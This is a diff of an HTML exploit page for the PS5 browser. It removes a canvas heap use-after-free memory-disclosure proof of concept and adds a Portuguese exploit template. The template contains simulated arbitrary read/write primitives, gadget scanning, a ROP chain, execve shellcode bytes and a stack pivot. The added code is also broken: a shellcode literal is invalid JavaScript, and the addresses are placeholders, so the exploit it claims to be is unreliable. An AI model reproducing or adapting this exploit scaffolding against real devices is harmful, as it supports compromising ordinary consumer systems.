@@ -1,132 +1,162 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Canvas Heap UAF PoC - Auto Stop</title>
-  <style>
-    body { font-family: sans-serif; padding: 20px; }
-    button { padding: 10px; font-size: 16px; }
-    #console { white-space: pre-wrap; font-family: monospace; border: 1px solid #ccc; padding: 10px; height: 300px; overflow-y: auto; margin-top: 10px; }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Exploit PS5 - Template Integrado</title>
+<style>
+  body { background: #121212; color: #eee; font-family: monospace; padding: 1rem; }
+  #log { 
+    background: #222; 
+    padding: 1rem; 
+    border-radius: 8px; 
+    height: 400px; 
+    overflow-y: auto; 
+    white-space: pre-wrap;
+    font-size: 14px;
+    line-height: 1.3em;
+  }
+  button { margin-top: 1rem; padding: 0.5rem 1rem; font-size: 1rem; cursor: pointer; }
+  .info { color: #9ad1ff; }
+  .success { color: #7fff7f; }
+  .warn { color: #ffcc66; }
+  .error { color: #ff6c6c; }
+</style>
 </head>
 <body>
-
-<h1>Canvas Heap UAF PoC (Auto-Stop on Leak)</h1>
-<p>Target: PS5 WebKit | Safe Memory Disclosure Test</p>
-<button onclick="runCycles(10)">Run Safe Cycles</button>
-<div><strong>Status:</strong> <span id="status">Idle...</span></div>
-<div><strong>Approx Memory Used:</strong> <span id="memUsage">0</span> MB</div>
-<div id="console"></div>
-
-<canvas id="canvas" width="512" height="512" style="display:none;"></canvas>
+<h1>Exploit PS5 - Template Integrado</h1>
+<p>Clique no botão abaixo para rodar. Veja as saídas aqui:</p>
+<button id="run">Rodar Exploit</button>
+<div id="log"></div>
 
 <script>
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
-const status = document.getElementById('status');
-const consoleDiv = document.getElementById('console');
-const memUsage = document.getElementById('memUsage');
-
-let approxMem = 0;
-let leakDetected = false;
-
-function log(msg) {
-  consoleDiv.textContent += msg + '\n';
-  consoleDiv.scrollTop = consoleDiv.scrollHeight;
-}
-
-function updateStatus(msg) {
-  status.textContent = msg;
-}
-
-function updateMemoryDisplay() {
-  memUsage.textContent = (approxMem / (1024 * 1024)).toFixed(2);
-}
-
-function fillImageData(imgData, value) {
-  const view = new Uint8Array(imgData.data.buffer);
-  view.fill(value);
-}
-
-function stressGC() {
-  const junk = [];
-  for (let i = 0; i < 200; i++) {
-    junk.push(new ArrayBuffer(1024 * 512)); // ~100MB
-    approxMem += 1024 * 512;
-  }
-  updateMemoryDisplay();
-}
-
-async function attemptMemoryDisclosure() {
-  log('Starting UAF Memory Disclosure attempt...');
-
-  const imgData = ctx.createImageData(512, 512);
-  fillImageData(imgData, 0x41);
-
-  const weakRef = new WeakRef(imgData);
-  stressGC();
-
-  const leakers = [];
-  const leakerSize = 1024 * 32; // 32 KB
-  const leakerCount = isPS5() ? 300 : 500;
-
-  for (let i = 0; i < leakerCount; i++) {
-    const buf = new ArrayBuffer(leakerSize);
-    leakers.push(buf);
-    approxMem += leakerSize;
+(() => {
+  const logEl = document.getElementById('log');
+  function log(msg, type = 'info') {
+    // Adiciona linha com cor conforme tipo e faz scroll automático
+    const span = document.createElement('span');
+    span.textContent = msg + '\\n';
+    span.className = type;
+    logEl.appendChild(span);
+    logEl.scrollTop = logEl.scrollHeight;
   }
 
-  updateMemoryDisplay();
+  // ======= PRIMITIVAS SIMULADAS =======
+  function arb_read(addr) {
+    // Simula leitura de 8 bytes na addr
+    // Retorna valor fictício (endereço ou dado)
+    return 0x4141414141414141n + (addr & 0xffn);
+  }
+  function arb_write(addr, value) {
+    // Simula escrita
+    log(`[arb_write] 0x${addr.toString(16).padStart(16,'0')} <- 0x${value.toString(16).padStart(16,'0')}`, 'warn');
+  }
 
-  for (let i = 0; i < leakers.length; i++) {
-    const view = new Uint8Array(leakers[i]);
-    for (let j = 0; j < view.length; j++) {
-      if (view[j] === 0x41) {
-        log(`Leak in buffer ${i}, byte ${j}`);
-        leakDetected = true;
-        return true;
+  // ======= 1. DUMP DE MEMÓRIA =======
+  function dump_mem(start_addr, size) {
+    let result = [];
+    for (let i = 0n; i < size; i += 8n) {
+      let val = arb_read(start_addr + i);
+      result.push("0x" + val.toString(16).padStart(16, '0'));
+    }
+    log("[*] Dump de memória:", 'info');
+    log(result.join(' '), 'info');
+    return result;
+  }
+
+  // ======= 2. SCAN DE GADGETS =======
+  function scan_for_gadget(start_addr, size, pattern) {
+    log(`[*] Scan de gadgets: ${size} bytes a partir de 0x${start_addr.toString(16)}`, 'info');
+    for (let i = 0n; i < size; i += 8n) {
+      let val = arb_read(start_addr + i);
+      if ((val & pattern.mask) === pattern.value) {
+        log(`[+] Gadget encontrado em 0x${(start_addr + i).toString(16)}: 0x${val.toString(16)}`, 'success');
+        return start_addr + i;
       }
     }
+    log("[!] Gadget não encontrado.", 'error');
+    return null;
   }
 
-  log('No leak detected in this attempt.');
-  return false;
-}
+  // ======= 3. CONSTRUÇÃO DE ROP CHAIN =======
+  function build_rop_chain() {
+    const GADGET_POP_RDI = 0xdeadbeefn;
+    const GADGET_POP_RSI = 0xcafebaben;
+    const GADGET_SYSCALL = 0xfeedfacen;
+    const ADDR_ARG1 = 0xabad1dean;
 
-async function runCycles(cycles = 10) {
-  approxMem = 0;
-  leakDetected = false;
-  updateMemoryDisplay();
+    let rop = [];
+    rop.push(GADGET_POP_RDI);
+    rop.push(ADDR_ARG1);
+    rop.push(GADGET_POP_RSI);
+    rop.push(0n);
+    rop.push(GADGET_SYSCALL);
 
-  for (let c = 0; c < cycles; c++) {
-    if (leakDetected) {
-      updateStatus('Leak detected! Halting further tests.');
-      log('*** Leak detected! Halting further tests. ***');
-      break;
+    log("[*] ROP Chain construída:", 'info');
+    log(rop.map(r => "0x" + r.toString(16)).join(' '), 'info');
+    return rop;
+  }
+
+  // ======= 4. ESCREVER SHELLCODE =======
+  const shellcode = [
+    0x48b8002f6170703000n, // mov rax, '/app0\0'
+    0x50n,                 // push rax
+    0x4889e7n,             // mov rdi, rsp
+    0x31f6n,               // xor esi, esi
+    0x31d2n,               // xor edx, edx
+    0xb83b000000n,         // mov eax, 59 (execve)
+    0x0fn05n               // syscall
+  ];
+
+  function write_shellcode(addr, code) {
+    for (let i = 0; i < code.length; i++) {
+      arb_write(addr + BigInt(i * 8), code[i]);
     }
-    updateStatus(`Cycle ${c + 1} of ${cycles}`);
-    log(`\n--- Cycle ${c + 1} ---`);
-    await new Promise(resolve => setTimeout(resolve, 100));
-    await attemptMemoryDisclosure();
-    await new Promise(resolve => setTimeout(resolve, 100));
+    log(`[*] Shellcode escrito em 0x${addr.toString(16)}`, 'success');
   }
 
-  if (!leakDetected) {
-    updateStatus('No leaks detected after all cycles.');
+  // ======= 5. STACK PIVOT (CONCEITUAL) =======
+  function stack_pivot(rop_chain_addr) {
+    const GADGET_STACK_PIVOT = 0xdeadf00dn;
+    const RET_ADDR_PTR = 0xabadcafen;
+
+    arb_write(RET_ADDR_PTR, GADGET_STACK_PIVOT);
+    arb_write(RET_ADDR_PTR + 8n, rop_chain_addr);
+
+    log("[*] Stack pivot configurado", 'success');
   }
-}
 
-function isPS5() {
-  return navigator.userAgent.includes('PlayStation 5');
-}
+  async function runExploit() {
+    try {
+      log("[*] Exploit iniciado", 'info');
 
-log(`User-Agent: ${navigator.userAgent}`);
-if (isPS5()) {
-  log('PS5 detected. Adjusting parameters...');
-} else {
-  log('Non-PS5 browser detected.');
-}
+      const BASE_ADDR = 0x100000000n;
+      const DUMP_SIZE = 0x1000n;
+
+      dump_mem(BASE_ADDR, DUMP_SIZE);
+      scan_for_gadget(BASE_ADDR, DUMP_SIZE, { mask: 0xffffn, value: 0xdeadn });
+
+      const rop_chain = build_rop_chain();
+
+      const SHELLCODE_ADDR = 0x200000000n;
+      write_shellcode(SHELLCODE_ADDR, shellcode);
+
+      const ROP_CHAIN_ADDR = 0x300000000n;
+      for (let i = 0; i < rop_chain.length; i++) {
+        arb_write(ROP_CHAIN_ADDR + BigInt(i * 8), rop_chain[i]);
+      }
+      log("[*] ROP Chain escrita na memória", 'success');
+
+      stack_pivot(ROP_CHAIN_ADDR);
+
+      log("[*] Exploit finalizado - agora aguarde o efeito", 'info');
+    } catch (e) {
+      log("[!] Erro no exploit: " + e.message, 'error');
+    }
+  }
+
+  document.getElementById('run').onclick = runExploit;
+})();
 </script>
-
 </body>
 </html>
